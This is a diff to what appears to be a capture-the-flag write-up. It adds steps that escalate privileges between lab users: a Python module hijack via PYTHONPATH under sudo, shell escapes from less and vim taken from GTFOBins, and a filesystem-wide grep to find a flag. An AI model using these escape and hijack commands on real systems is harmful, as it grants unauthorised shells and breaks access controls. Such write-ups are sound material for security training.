@@ -193,5 +193,29 @@ echo "import pty;pty.spawn('/bin/bash')" > /tmp/shop.py
 ```
 And now we need to redirect the script to run our module, we can do that by changing the environment variable called `PYTHONPATH`, and by changing it to the path of our written module we can do the evil thing 😈.
 ```bash
-sudo -u jordan PYTHONPATH=/tmp/ script.py
+sudo -u jordan PYTHONPATH=/tmp/ /opt/scripts/Gun-Shop.py
+```
+And use the command `rev` to print the flag in a proper way:
+```bash
+rev flag.txt
+```
+
+---
+#### Ken's Flag
+The repeating things `sudo -l`, you will find a way with the `less` command, and go to [GTFobins](https://gtfobins.github.io/gtfobins/bash/) and take the shell code...
+```bash
+sudo -u ken less /etc/profile
+!/bin/sh
+```
+
+---
+#### Sean's Flag
+The repeating things `sudo -l`, you will find a way with the `vim` command, and go to [GTFobins](https://gtfobins.github.io/gtfobins/bash/) and take the shell code...
+```bash
+sudo -u sean vim -c ':!/bin/sh'
+```
+But where the flag!!!!!!
+This command will search recursivly in the files to find `sean` written i any file.
+```bash
+grep -r sean /* 2>/dev/null
 ```
